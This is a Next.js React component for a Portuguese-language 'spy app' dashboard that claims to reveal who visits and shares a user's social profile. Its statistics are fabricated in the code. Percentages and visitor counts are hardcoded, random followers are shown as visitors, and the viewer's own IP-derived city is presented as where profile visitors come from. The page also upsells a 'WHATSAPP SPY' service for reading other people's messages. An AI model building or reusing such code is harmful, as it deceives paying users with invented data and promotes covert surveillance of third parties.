'use client'
import { PieChart, Pie, Cell } from 'recharts';
import { useUserStore } from '@/app/user/store/userStore';
import moment from 'moment';
import { useRouter } from 'next/navigation'; // Corrigido para usar next/navigation em vez de next/router
import { useCallback, useEffect, useState } from 'react';
import { getImageBase64 } from '@/app/actions/imageProxyActions';
import Image from 'next/image';
import { getRandomItems } from '@/app/actions/getRandowmItems';
import { StoriesActivity } from '@/app/compoents/stories';
import Link from 'next/link';
import { FaSearch, FaArrowRight } from 'react-icons/fa';
import { emailStore } from '@/app/user/store/emailStore';

const data = [
  { name: 'Visitas ao perfil', label: 'Visitas ao perfil', value: 37, color: '#f59e0b' }, // laranja
  { name: 'Seguidores', label: 'Seguidores', value: 87, color: '#3b82f6' },        // azul
  { name: 'Não Seguidores', label: 'Não Seguidores', value: 13, color: '#8b5cf6' }     // lavanda/roxo
];

const RandomFollowers = () => {
  const [visitantes, setVisitantes] = useState<{ avatar: string }[]>([]);
  const followings = useUserStore((state) => state.followers);
  const followers = useUserStore((state) => state.followings);
  const email = emailStore((state) => state.email);
  const router = useRouter();

  const load = useCallback(async () => {
    const allUsersMap = new Map();
    [...followings.followers.users, ...followers.followers.users].forEach((u) => {
      allUsersMap.set(u.pk, u);
    });

    const allUsers = Array.from(allUsersMap.values());
    const selectedUsers = await getRandomItems(allUsers, 4);

    const visitantesConvertidos = await Promise.all(
      selectedUsers.map(async (user: any) => ({
        avatar: await getImageBase64(user.profile_pic_url)
      }))
    );

    setVisitantes(visitantesConvertidos);
  }, [followings, followers]);


  useEffect(() => {
    if(!email.id) {
      router.push('/login');
      return;
    }
    load();
  }, [email, load, router]);

  return (
    <div className="flex justify-center -space-x-3 mt-2">
      {visitantes.map((v, idx) => (
        <Image
          key={idx}
          src={v.avatar}
          alt={`seguidor-${idx}`}
          width={36}
          height={36}
          className="rounded-full border-2 border-white"
        />
      ))}
    </div>
  );
};

const CustomDashboard = () => {
  const router = useRouter();
  const user = useUserStore((state) => state.user);

  const getFollowers = useUserStore((state) => (state.getFollowers));
  const getFollowings = useUserStore((state) => (state.getFollowings));
  const getStories = useUserStore((state) => (state.getStories));
  const getPublications = useUserStore((state) => (state.getPublications));
  const [city, setCity] = useState<string>('');
  const [procfileImage, setProcfileImage] = useState<string>('');

  const loadFollowers = useCallback(async () => {
    if (!user?.id) return;

    try {
      const img = await getImageBase64(user.profile_pic_url_hd);

      setProcfileImage(img);

      await Promise.all([
        await getFollowings(user.id, 10, null),
        await getFollowers(user.id, 10, null),
        await getStories(user.id),
        await getPublications(user.id, 10, null)
      ]);

    } catch (err) {
      console.error("Erro ao carregar listas:", err);
    }
  }, [getFollowers, getFollowings, getPublications, getStories, user?.id, user?.profile_pic_url_hd]);


  useEffect(() => {
    loadFollowers();
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        console.log('Cidade:', data.city);
        setCity(data.city);
      });
  }, [loadFollowers]);

  const handleNewSearch = () => {
    router.push('/acess/busca');
  };

  return (
    <div className="w-full max-w-md mx-auto p-4 bg-white rounded-2xl shadow-lg relative pb-16">
      {/* Botão flutuante para nova busca */}
      <div className="fixed bottom-6 right-6 z-50">
        <button 
          onClick={handleNewSearch}
          className="flex items-center justify-center bg-blue-600 hover:bg-blue-700 text-white rounded-full w-14 h-14 shadow-lg transition-all duration-300 hover:scale-105"
          aria-label="Nova busca"
        >
          <FaSearch size={20} />
        </button>
      </div>

      <div className="text-center">
        <p className="text-gray-500 text-sm">acesso.spyapp.digital</p>
        <div className="flex items-center justify-center mt-2">
          <div className="w-14 h-14 bg-gray-200 rounded-full" >
            {procfileImage !== "" && <Image className='rounded-full' width={100} height={100} src={procfileImage} alt="Profile" />}
          </div>
        </div>
        <p className="font-semibold mt-2">{user?.full_name}</p>
        <p className="text-gray-400 text-sm">{user?.username}</p>
      </div>

      <div className="bg-gray-100 rounded-xl p-4 mt-6 shadow-md text-center">
        <p className="text-sm text-gray-700 font-semibold mb-1">WHATSAPP SPY</p>
        <p className="text-sm text-gray-500 mb-2">Veja mensagens, fotos e conversas do WhatsApp de quem você quiser.</p>
        <a
          href="/acess/whatsapp"
          className="inline-block bg-black text-white text-sm font-semibold px-4 py-2 rounded-full transition hover:bg-gray-800"
        >
          Acessar agora
        </a>
        <p className="text-xs text-gray-400 mt-2">Oferta disponível por tempo limitado</p>
      </div>

      {/* Link para nova busca no topo também */}
      <div className="mt-6 bg-gray-100 rounded-xl p-4 shadow-md text-center">
        <p className="text-sm text-gray-700 font-semibold mb-1">NOVA BUSCA</p>
        <p className="text-sm text-gray-500 mb-2">Busque informações de outro perfil</p>
        <Link 
          href="/acess/busca"
          className="inline-flex items-center bg-green-600 text-white text-sm font-semibold px-4 py-2 rounded-full transition hover:bg-green-700"
        >
          Iniciar nova busca <FaArrowRight className="ml-2" />
        </Link>
      </div>

      {/* Interações */}
      <div className="mt-6">
        <h2 className="text-lg font-semibold">Interações</h2>
        <p className="text-sm text-gray-500 mb-2">Hoje - {moment().format('DD/MM/YYYY')}</p>
        <div className="flex items-center justify-center">
          <PieChart width={120} height={120}>
            <Pie
              data={data}
              dataKey="value"
              outerRadius={50}
              innerRadius={35}
              paddingAngle={2}
            >
              {data.map((entry, index) => (
                <Cell key={`cell-${index}`} fill={entry.color} />
              ))}
            </Pie>
          </PieChart>
        </div>
        <div className="flex justify-between mt-2 px-4 text-sm">
          <div className="text-center mt-4">
            <p className="text-sm text-gray-600">
              <span className="text-yellow-500 font-bold">87%</span> Seguidores
            </p>
            <RandomFollowers />
          </div>
          <span className="text-blue-500">13% Não Seguidores</span>
          <span className="text-blue-500">37% Visitantes</span>
        </div>
      </div>

      <div className="mt-6">
        <p className="font-medium">Compartilharam seu perfil essa semana</p>
        <p className="text-sm text-gray-500 mt-1">36 pessoas</p>
        <div className="flex space-x-2 mt-2">
          <RandomFollowers />
        </div>
      </div>

      <div className="mt-6">
        <p className="font-medium">Agora no seu perfil</p>
        <p className="text-sm text-gray-500 mt-1">5 pessoas</p>
        <div className="flex space-x-2 mt-2">
          <RandomFollowers />
        </div>
      </div>


      <div>
        <StoriesActivity RandomComponent={RandomFollowers} isDashboard={true} />
      </div>

      <div className="mt-6">
        <p className="font-medium">Tipo de conteúdo mais compartilhado</p>
        <div className="mt-2">
          <p className="text-sm">Stories</p>
          <div className="h-2 bg-gray-200 rounded-full">
            <div className="h-2 bg-yellow-500 w-2/5 rounded-full" />
          </div>
          <p className="text-sm mt-2">Publicações (Feed)</p>
          <div className="h-2 bg-gray-200 rounded-full">
            <div className="h-2 bg-yellow-500 w-4/5 rounded-full" />
          </div>
        </div>
      </div>


      <div className="mt-6">
        <p className="font-medium">Lugares que mais visitam seu perfil</p>
        <p className="text-sm mt-1">{city}</p>
        <div className="h-2 bg-gray-200 rounded-full">
          <div className="h-2 bg-yellow-500 w-11/12 rounded-full" />
        </div>
        <p className="text-sm mt-2">Outros</p>
        <div className="h-2 bg-gray-200 rounded-full">
          <div className="h-2 bg-blue-500 w-1/12 rounded-full" />
        </div>
      </div>
    </div>
  );
};

export default CustomDashboard;